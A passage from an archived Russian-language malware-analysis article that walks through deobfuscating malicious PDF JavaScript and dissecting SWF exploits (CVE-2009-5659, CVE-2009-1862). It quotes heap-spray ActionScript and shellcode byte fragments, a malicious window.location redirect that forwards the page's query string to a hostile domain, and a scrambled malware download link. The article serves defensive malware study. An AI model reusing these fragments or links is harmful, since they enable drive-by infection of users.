document.write, что приведёт к печати расшифрованного скрипта в окно 
браузера вместо его исполнения. 
<br><br>
В данном случае описанный приём не сработает из-за защиты от отладки (см. 
файл 8-script2-fail!.html). Во-первых, скрипт использует собственный код 
(arguments.callee<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[8]</a>) в алгоритме дешифрования - таким образом, при замене 
eval на document.write алгоритм отрабатывает некорректно.  

<br><br>
<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash06.png" width="500">
<br>
Во-вторых, осуществляется проверка переменной app, которая 
инициализирована в JavaScript-среде приложения (в данном случае - Adobe 
Acrobat), и не инициализирована в среде браузера или иного интерпретатора 
JavaScript.
<br><br>
<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash07.png">
<br>
Подытожим алгоритм авторасшифровки скрипта вопреки всем этим нюансам.
<br><br>
1. Вместо переменной arguments.callee должен быть подставлен оригинальный 
код скрипта, завёрнутый в функцию unescape.  
<br><br>
2. Проверка переменной app нужно обойти любым удобным способом (например, добавив в скрипт команду var app = true).
<br><br>
3. Все вхождения функции eval() должны быть заменены на document.write().
<br><br>
4. Из аргумента к функции document.write() должны быть отфильтрованы 
угловые скобки, которые в противном случае будут поглощены 
HTML-интерпретатором браузера вместе с частью вывода. 
<br>

<pre><font size="2">function debrack(s) {
s=s.replace(/&gt;/g, "&amp;gt;");
s=s.replace(/&lt;/g, "&amp;lt;");
return(s);
}</font></pre>
<b>От скрипта к бинарному коду</b>
<br><br>
В результате исполнения модифицированного таким образом скрипта (см. файл 
9-script2-ok.html) в браузере получаем очередную порцию кода (см. файл 
a-script3). Она запутана аналогично предыдущей, и является последней, 
центральной частью скрипта, так как не содержит в себе вызовов функции 
eval.  
<br><br>
Быстрый просмотр скрипта выявляет его функциональное ядро:
<br><br>
1. Неоднократный вызов функции unescape с длинными аргументами вида: 
"%u9090%u9090%u9090%u21eb%ub859:..".  
<br><br> 
В строках-аргументах к функции unescape усматривается shell-код, так как 
закодированы преимущественно байты, выходящие за пределы диапазона 
печатных символов [21h.. 7Eh]. К тому же, первая строка начинается с 
нескольких байт 90h, который соответствует команде процессора NOP. 
<br><br>

2. this.collabStore = Collab.collectEmailInfo({subj: "", msg: D_3_0824mk});
<br><br>
Вызов этой нестандартной для JavaScript функции сразу же привлекает 
внимание, а поиск в Интернете по соответствующим ключевым словам наводит 
на описание уязвимости CVE-2009-5659<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[9]</a> (равно как и на рекламу коммерческих 
связок эксплойтов). 
<br><br>
Исследование shell-кода и самой уязвимости выходят за рамки этой статьи. 
Отметим лишь, что в бинарном коде полезной нагрузки 
(d-shellcode.exe-payload) просматривается невооружённым взглядом ссылка на 
вредоносный модуль, который будет загружен и выполнен в результате 
эксплуатации уязвимости.  
<br><br>
<small>thpt/:a/gfitbhtaewc.mon/etT/ERTS.3ype/2H85b9b9Vd10000f0700R6575c0ff101T2dbf77dd902l140903K431102</small>
<br><br>
Исследование можно продолжить, использовав части этой ссылки для поиска по 
базе вредоносных ссылок malc0de.net, по логам общедоступных песочниц и т. п. 

	<a id="a_title" name="example2" style="color:inherit;text-decoration: none;"><h3>Пример 2. SWF</h3></a>


В отличие от документов в формате PDF, структура которых легко читается 
невооружённым взглядом, ролики Adobe Flash более сложны для анализа. 
Поэтому для начала рассмотрим тривиальный экземпляр вредоносного объекта 
типа Flash: Trojan-Downloader.SWF.Small.fj (MD5: 
f8e4e4206586f566c5dddc74884e57df).  
<br><br>

Это файл размером 232 байта. В начале файла - сигнатура CWS, 
соответствующая формату Flash с компрессией<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[10]</a>. Для его распаковки можно 
воспользоваться, к примеру, утилитой <a href="https://web.archive.org/web/20180418165306/http://iancoog.altervista.org/">cws2fws</a>. Сигнатура формата Flash без 
компрессии, готового к анализу - FWS.  
<br><br>
Формат Flash - бинарный. Он описывает, помимо метаинформации и статичного 
медиа-контента, скомпилированную программу на скриптовом языке 
ActionScript, которая обеспечивает всю динамическую и интерактивную 
функциональность Flash: от управления визуальными формами до открытия 
веб-страниц. Для анализа структуры файла можно воспользоваться пакетом 
утилит <a href="https://web.archive.org/web/20180418165306/http://www.swftools.org/">SWFTools</a>. 
<br><br>
С точки зрения потенциально вредоносного содержимого Flash-объекта, 
наибольший интерес представляет именно программа на языке ActionScript. 
Для декомпиляции ActionScript можно воспользоваться утилитой <a href="https://web.archive.org/web/20180418165306/http://www.hp.com/go/swfscan">SWFScan</a>, для получения дампа 
мнемоник байт-кода - утилитой swfdump из пакета SWFTools. 
<br><br>
Декомпилированный ActionScript данного файла выглядит так: 
<br><br>
<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash08.png" width="500">

<br>

Как видно из скрипта, Flash-объект передаёт в командную строку браузера 
небольшой скрипт (this.getURL). Расшифровав скрипт, получаем строку:  
<br>
window.location = "//pizdachesabuserov.xorg.pl/go/'+document.location.search+'"; 
<br><br>
Таким образом, данный Flash-ролик производит перенаправление браузера на 
другой домен с передачей последнему аргументов к текущему веб-адресу (то 
есть, части строки URL после вопросительного знака). Это элемент сценария 
массового заражения веб-пользователей с использованием технологии 
«отравления» поисковых систем (SEO Poisoning)<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[11]</a>. 

	<a id="a_title" name="example3" style="color:inherit;text-decoration: none;"><h3>Пример 3. PDF + SWF</h3></a> 

Теперь, понимая принципы анализа как PDF-, так и SWF-файлов, рассмотрим 
более сложный случай: Exploit.SWF.Agent.br (MD5: 
09a0f7aae0e22b5d80c7950890f3f738). Это относительно старый эксплойт, 
обнаруженный ещё в июле 2009, но изрядно нашумевший из-за интересных 
особенностей строения вредоносного файла<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[12]</a>. 

<br><br>
Это документ PDF размером около мегабайта. Быстрый просмотр структуры 
файла выявляет большое количество PDF-объектов вперемешку с массивными 
блоками бинарных данных, поэтому для анализа структуры файла целесообразно 
воспользоваться утилитой pdf-parser. 
<br><br>
<b>Структура PDF</b>
<br><br>
При анализе структуры файла (pdf-parser.py 0-sample &gt; 1-pdfparse) ничто не 
бросается в глаза. Скрипты отсутствуют, зато есть несколько объектов типов 
ObjStm и XObject, неясного назначения. 
<br><br>
Проанализируем PDF более внимательно, включив в дамп структуры файла 
вывод распакованных бинарных данных (pdf-parser.py -f 0-sample &gt; 
2-streamfilter). Задача при этом - проверить, не скрывается ли что-нибудь 
подозрительное в массивах сжатых данных. 
<br><br>
Быстрый визуальный просмотр наиболее крупных блоков распакованных данных 
выявляет несколько картинок (/Subtype /Image - объекты 29, 31, 5), блок 
метаданных (/Type /Metadata - объект 6) и два подозрительных блока 
вложенной разметки PDF (объекты 33 и 7). При более внимательном изучении 
одного из этих блоков (33) обнаруживаются ссылки на два вложенных 
SWF-файла:
<br>
<pre><font size="2">&lt;&lt;/EF&lt;&lt;/F 2 0 R&gt;&gt;/F(fancyBall.swf)/Type/Filespec/UF(fancyBall.swf)&gt;&gt;
&lt;&lt;/EF&lt;&lt;/F 3 0 R&gt;&gt;/F(oneoff.swf)/Type/Filespec/UF(oneoff.swf)&gt;&gt;</font></pre>

Возможность встраивать Flash-объекты в PDF-документы появилась в Adobe 
Reader начиная с версии 9 и описана в приложении к ISO 32000<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[13]</a>. 
<br><br>

Во втором PDF-объекте (7) обнаруживается ссылка на вложенное изображение:
<br>
<pre><font size="2">&lt;&lt;/F 4 0 R&gt;&gt;/F(love_wallpaper_butterfly-dsc08951.jpg)</font></pre>

Сохраним соответствующие объекты (2, 3 и 4) для последующего анализа 
(pdf-parser.py -o 2 -d 0-sample &gt; 3- fancyball.swf и т.п.). 
<br><br>

<b>Анализ вложенных Flash-объектов</b>

<br><br>

В результате декомпиляции программы fancyball.swf получается невинный 
скрипт, скопированный из примеров к Flash Professional 9 ActionScript 3.0 
Preview<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[14]</a> (файл 3.1-actionscript-decompile): 
<br>
<pre> <font size="2">public function Ball()
{
    trace("ball created: " + this.name);
    this.buttonMode = true;
    this.addEventListener(MouseEvent.CLICK, this.clickHandler);
    this.addEventListener(MouseEvent.MOUSE_DOWN, this.mouseDownListener);
    this.addEventListener(MouseEvent.MOUSE_UP, this.mouseUpListener);
    return;
}</font></pre>

Однако дамп байт-кода того же скрипта (swfdump -D 3.0-fancyball.swf &gt; 
3.2-actionscript-dump) показывает, что функция инициализации скрипта 
переписана небольшим кодом неясного назначения: 
<br>

<pre><font size="2">initmethod * init=()(0 params, 0 optional)
[stack:2 locals:1 scope:1-9 flags:]
{
    00000) + 0:0 pushshort 2049 
    00001) + 1:0 pushshort 12536
    00002) + 2:0 multiply
    00003) + 1:0 pushscope
    00004) + 0:1 getlex &lt;q&gt;[public]::void
    00005) + 1:1 nop
    00006) + 1:1 nop
:
    00033) + 1:1 returnvoid
}

</font></pre>
Всё, что делает приведенный код - перемножает два числа на стеке (причем, 
в результате умножения получается адрес в пределах кучи), после чего 
обращается неуказанному объекту (см. справочник инструкций для виртуальной 
машины ActionScript<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[15]</a>). В результате интерпретации этих инструкций 
управление передается в область кучи (CVE-2009-1862).  
<br><br>

А что находится в куче?
<br><br>

Рассмотрим декомпилированный скрипт второго Flash-объекта - oneoff.swf (файл 4.1-actionscript-decompile).
<br><br>
1. Присвоение двух локальных переменных.
<br>

<pre><font size="2">internal function frame1()
{
    this.b = "";
    this.a = "";
</font></pre>

Как видно из дампа байт-кода, это два числа: 0x0c0c0c0c и 0x13131313.
<br><br>

<pre><font size="2">00002) + 0:1 findproperty &lt;q&gt;[public]::b
00003) + 1:1 pushstring "\0c\0c\0c\0c"
00004) + 2:1 initproperty &lt;q&gt;[public]::b
00005) + 0:1 findproperty &lt;q&gt;[public]::a
00006) + 1:1 pushstring "\13\13\13\13"
00007) + 2:1 initproperty &lt;q&gt;[public]::a
</font></pre> 

2. Создание последовательности из байта 0x13 длиной 1 Мб (1048576=1024^2).
<br><br>
<pre><font size="2">while(this.b.length &lt; -1048576)
{
    this.b = this.b + this.a;
}</font></pre>

3. Динамическое создание массива в куче.
<br>
<pre><font size="2">this.byteArr = new ByteArray();
</font></pre>

4. Заполнение этого массива ранее сгенерированной последовательностью 64 раза. 
<br>
<pre><font size="2">this.byteArr = new ByteArray();
while(this.byteArr.length &lt; -1048576 * 64)
{
     byteArr.writeMultiByte(this.b, "iso-8859-1");
}</font></pre>

5. Динамическая генерация shell-кода в конце того же массива.
<br>
<pre><font size="2">... 
byteArr.writeByte(144);
byteArr.writeByte(144);
byteArr.writeByte(129);
byteArr.writeByte(236);
byteArr.writeByte(32);
byteArr.writeByte(1);
...</font></pre>

Таким образом, в результате выполнения программы этого Flash-объекта 
динамическая память соответствующего процесса будет заполнена массивом из 
64 мегабайт нейтральных инструкций (байт-коду 0х13 соответствует 
инструкция adc edx,[ebx]), в самом конце которого расположен shell-код. 
Это heap spray - техника, обеспечивающая надёжное исполнение shell-кода 
без его привязки к конкретному адресу в памяти процесса, на который должно 
перейти исполнение в результате эксплуатации уязвимости. 
<br><br>
Shell-код, детали которого мы рассматривать не будем, расшифровывает и 
запускает вредоносные модули, содержащиеся в файле картинки 
love_wallpaper_butterfly-dsc08951.jpg. Эти модули можно расшифровать и 
выделить из файла вручную, обратив внимание на длинные последовательности 
из одного байта (0xA0, 0x37) в коде файла и предположив, что они 
соответствуют результату потокового XOR-шифрования последовательности 
нулей, характерной для заголовка исполняемого модуля (см. файлы 
7-malware1.ex, 9.0-malware2).   
<br><br>
<center><img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash09.png"></center>
<br>

Кроме исполняемых модулей, в той же «картинке» обнаруживается 
ещё один вложенный PDF-файл (8.0-emdedded.pdf). 

<a id="a_title" name="conclusions" style="color:inherit;text-decoration: none;"><h2>Выводы</h2></a> 

Подытоживая анализ примеров, ещё раз подчеркнём несколько важных моментов.
<br><br>
1. Обе уязвимости, эксплуатируемые рассмотренными вредоносными файлами, являются кроссплатформенными.
<br><br>

2. Уязвимость, упомянутая в последнем примере (CVE-2009-1862), помимо 
этого, еще и кроссформатная: объекты Adobe Flash могут исполняться в 
качестве самостоятельных модулей, могут быть встроены в веб-страницу или в 
PDF-документ. 
<br><br>
3. Таким образом, пространство для атаки при помощи эксплойта из 
последнего примера обширно: атака может осуществляться по нескольким 
векторам (Flash на веб-странице, PDF-документ) на четырёх операционных 
системах (Windows, Macintosh, Linux и Solaris<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[16]</a>). Это в большей или 
меньшей степени касается любых Flash-уязвимостей. 
<br><br>
4. От примерной даты обнаружения уязвимости (1 июня 2009 - дата принятия 
уязвимости по базе CVE) до момента выпуска патча компанией Adobe (30 июля 
2009 года - дата соответствующего бюллетеня<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[17]</a>) прошло 2 месяца. 
<br><br>
Приложение к статье: <a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/files/nb2-flash-attachment.rar">nb2-flash-attachment.rar</a> (пароль к архиву высылается <a href="https://web.archive.org/web/20180418165306/mailto:alisa@esagelab.ru">по запросу</a>).

<a id="a_title" name="reference" style="color:inherit;text-decoration: none;"><h2>Список ссылок</h2></a> 


1. Лаборатория Касперского. <a href="https://web.archive.org/web/20180418165306/http://www.securelist.com/ru/analysis/208050606/Kaspersky_Security_Bulletin_2009_Osnovnaya_statistika_za_2009_god#1">Kaspersky Security Bulletin 2009. Основная статистика за 2009 год.</a>
<br>2. ScanSafe. <a href="https://web.archive.org/web/20180418165306/http://www.computerworld.com/s/article/9157438/Rogue_PDFs_account_for_80_of_all_exploits_says_researcher?source=rss_news">Annual Global Threat Report 2009.</a>
<br>3. Лаборатория Касперского. <a href="https://web.archive.org/web/20180418165306/http://www.securelist.com/ru/analysis/208050602/Reyting_vredonosnykh_programm_dekabr_2009">Рейтинг вредоносных программ, декабрь 2009.</a> 
<br>4. Лаборатория Касперского. <a href="https://web.archive.org/web/20180418165306/http://www.securelist.com/ru/analysis/208050611/Reyting_vredonosnykh_programm_yanvar_2010">Рейтинг вредоносных программ, январь 2010.</a>
<br>5. D. Stevens. <a href="https://web.archive.org/web/20180418165306/http://hakin9.org/system/articles/attachment1s/7862/original/pdf_article.pdf?1249336858">Anatomy of Malicious PDF Documents</a>
<br>6. Adobe. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/devnet/acrobat/pdfs/PDF32000_2008.pdf">Portable Document Format - Part 1: PDF 1.7, First Edition</a> 

<br>7. Milw0rm. <a href="https://web.archive.org/web/20180418165306/http://www.milw0rm.com/exploits/8569">Эксплойт для CVE 2009-1492 </a>
<br>8. Bojan Zdrnja. <a href="https://web.archive.org/web/20180418165306/http://isc.sans.org/diary.html?storyid=1519">Browser *does* matter, not only for 
vulnerabilities - a story on JavaScript deobfuscation.</a>
<br>9. SecurityFocus. <a href="https://web.archive.org/web/20180418165306/http://downloads.securityfocus.com/vulnerabilities/exploits/27641-collectEmailInfo-PoC.txt">Эксплойт 
для CVE-5659</a>
<br>10. Adobe. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/devnet/swf/pdf/swf_file_format_spec_v10.pdf">SWF File Format Specification Version 10</a>
<br>11. <a href="https://web.archive.org/web/20180418165306/http://blocklistpro.com/latest/tiger-woods-seo-poisoning-attack.html">Tiger Woods SEO poisoning attack</a>
<br>12. Лаборатория Касперского. <a href="https://web.archive.org/web/20180418165306/http://www.securelist.com/ru/weblog/39128/SWF_ili_PDF_Vse_odno_Adobe">SWF или PDF? Все одно - Adobe!</a>

<br>13. Adobe. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/devnet/acrobat/pdfs/adobe_supplement_iso32000.pdf">Acrobat Supplement to the ISO 32000</a>
<br>14. Jen deHaan. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/de/devnet/flash/articles/flash9_as3_preview_print.html">Exploring the Flash Professional 9 ActionScript 
3.0 Preview</a>
<br>15. Adobe. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/devnet/actionscript/articles/avm2overview.pdf">ActionScript Virtual Machine 2 Overview</a>
<br>16. Adobe. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/support/security/advisories/apsa09-03.html">Security advisory for Adobe Reader, Acrobat and 
Flash Player</a>
<br>17. Adobe. <a href="https://web.archive.org/web/20180418165306/http://www.adobe.com/support/security/bulletins/apsb09-10.html">Security updates available for Adobe Flash Player, 
Adobe Reader and Acrobat</a>

<p class="author" style="padding-left: 0px;"><br>Last updated: 17.03.2012</p>

</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20180418165306/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20180418165306/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/about">/about</a> <a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20180418165306/https://ssl' : 'https://web.archive.org/web/20180418165306/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 16:53:06 Apr 18, 2018 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:21:25 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 1.063
  exclusion.robots: 0.257
  exclusion.robots.policy: 0.242
  esindex: 0.013
  cdx.remote: 61.181
  LoadShardBlock: 46.973 (3)
  PetaboxLoader3.datanode: 94.593 (4)
  load_resource: 86.035
  PetaboxLoader3.resolve: 25.496
-->